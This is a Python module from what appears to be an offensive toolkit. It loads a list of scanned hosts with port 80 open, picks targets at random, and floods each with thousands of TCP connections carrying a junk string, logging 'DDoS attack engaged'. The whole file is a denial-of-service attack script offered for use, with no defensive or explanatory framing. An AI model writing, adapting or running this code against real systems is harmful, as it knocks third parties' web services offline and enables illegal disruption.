from packages.system.echoX import echoC
import time, socket, os, sys, string
import random

ipList = 'packages/attacking/ipListPort80.txt'

def getIPList():
	try:
		with open(ipList) as f:
			content = [x.strip('\n') for x in f.readlines()]
	except Exception as e:
		echoC(__name__, "No IPs scanned yet, so no DoS attack possible")
		content = -1
	return content
	
def dos(ip, port):	
	# MEssage
	msg = "928ghs8mc9q84mvvnba5snn7q2t3vcgbcyfhb97nxgh673h"
	
	ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		ddos.connect((ip, port))
		ddos.send(msg)
		ddos.sendto(msg, (ip, port))
		ddos.send(msg);
	except Exception as e:
		echoC(__name__, "Connection failed: " + str(e))
		time.sleep(1)
		return
		
	echoC(__name__, "DDoS attack engaged")
	ddos.close()

def main():

	echoC(__name__, "Starting a DoS attack")

	# Attacking port 
	port = 80
	
	# Number of connections 
	conn = 10000
	
	error = 0
	
	# Read all existing IPs 
	ips = getIPList()
	if ips == -1:
		return -1
	
	firstTime = True
	while random.randint(0, 2) != 0 or firstTime == True:
		firstTime = False
		
		# Select a random IP 
		rand = random.randint(0, len(ips)-1)
		host = ips[rand]
		ip = socket.gethostbyname(host)
		
		echoC(__name__, "Attacking '" + ip + "'")
		
		for i in range(1, conn):
			error = dos(ip, port)
	
	echoC(__name__, "Done")
	
	returnval = str(error) + "," + str(conn) + " connections on " + str(ip) + ":" + str(port)
	return returnval

if __name__ == "__main__":
	main()
